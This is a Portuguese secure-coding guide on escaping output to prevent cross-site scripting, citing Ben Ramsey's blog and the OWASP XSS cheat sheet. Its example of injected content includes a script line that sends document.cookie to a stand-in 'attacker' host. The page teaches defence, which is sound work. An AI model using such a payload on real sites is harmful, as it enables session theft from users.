# Escape as Saídas

### Explicação de um Parágrafo

HTML e outras linguagens da Web combinam conteúdo com código executável - um único parágrafo HTML pode conter uma representação visual de dados junto com instruções de execução de JavaScript. Ao renderizar HTML ou retornar dados da API, o que acreditamos ser um conteúdo puro pode realmente incorporar código JavaScript que será interpretado e executado pelo navegador. Isso acontece, por exemplo, quando renderizamos conteúdo que foi inserido por um invasor em um banco de dados - por exemplo `<div><script>//malicious code</script></div>`. Isso pode ser mitigado instruindo o navegador a tratar qualquer parte de dados não confiáveis ​​apenas como conteúdo e nunca interpretá-los - essa técnica é chamada de escape. Muitas bibliotecas npm e mecanismos de templates HTML fornecem recursos de escape (example: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). Não só o conteúdo HTML deve ser escapado, mas também CSS e JavaScript


### Exemplo de código: não coloque dados não confiáveis ​​no seu HTML

```html
<script>...NUNCA COLOQUE DADOS NÃO CONFIÁVEIS AQUI...</script>   direto em um script
 
 <!--...NUNCA COLOQUE DADOS NÃO CONFIÁVEIS AQUI...-->             dentro de um comentário HTML
 
 <div ...NUNCA COLOQUE DADOS NÃO CONFIÁVEIS AQUI...=test />       em um nome de atributo
 
 <NUNCA COLOQUE DADOS NÃO CONFIÁVEIS AQUI... href="/test" />   no nome de uma tag
 
 <style>...NUNCA COLOQUE DADOS NÃO CONFIÁVEIS AQUI...</style>   direto no CSS

```

### Exemplo de código - Conteúdo mal-intencionado que pode ser injetado em um banco de dados

```html
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Citação de Blog: "Quando não queremos que os caracteres sejam interpretados"

Do Blog [benramsey.com](https://benramsey.com/articles/escape-output/)
> Os dados podem deixar sua aplicação na forma de HTML enviado para um navegador da Web, SQL enviado para um banco de dados, XML enviado para um leitor de RSS, WML enviado para um dispositivo sem fio, etc. As possibilidades são ilimitadas. Cada um deles tem seu próprio conjunto de caracteres especiais que são interpretados de maneira diferente do resto do texto simples recebido. Às vezes queremos enviar esses caracteres especiais para que eles sejam interpretados (tags HTML enviadas para um navegador da Web, por exemplo), enquanto outras vezes (no caso de entrada de usuários ou alguma outra fonte), não queremos que os caracteres para ser interpretado, então precisamos escapar eles.

> Escaping também é conhecido como codificação. Em suma, é o processo de representar dados de maneira que não sejam executados ou interpretados. Por exemplo, o HTML renderizará o texto a seguir em um navegador da Web como texto em negrito, porque as marcações `<strong>` têm um significado especial:
> ```html
> <strong>Isso é um texto em negrito.</strong>
> ```


<br/><br/>

### Citação de Blog: "OWASP recomenda usar uma biblioteca de codificação focada em segurança"

Do blog OWASP [Folha de Dicas de Prevenção de XSS (Cross Site Scripting)](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Escrever esses codificadores não é tremendamente difícil, mas existem algumas armadilhas ocultas. Por exemplo, você pode se sentir tentado a usar alguns dos atalhos de escape, como "\" em JavaScript. No entanto, esses valores são perigosos e podem ser mal interpretados pelos analisadores aninhados no navegador. Você também pode esquecer de escapar do caracter de escape, que os atacantes podem usar para neutralizar suas tentativas de segurança.**OWASP recomenda o uso de uma biblioteca de codificação focada em segurança para garantir que essas regras sejam implementadas corretamente**."


<br/><br/>

### Citação de Blog: "Você DEVE usar a sintaxe de escape para a parte do HTML"

Do blog OWASP [Folha de Dicas de Prevenção de XSS (Cross Site Scripting)](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Mas a codificação de entidade HTML não funciona se você estiver colocando dados não confiáveis ​​dentro de uma tag `<script>` em qualquer lugar, ou um atributo do manipulador de eventos, como onmouseover ou dentro de CSS, ou em uma URL. Portanto, mesmo se você usar um método de codificação de entidade HTML em todos os lugares, provavelmente ainda estará vulnerável ao XSS. Você DEVE usar a sintaxe de escape para a parte do documento HTML na qual você está colocando dados não confiáveis."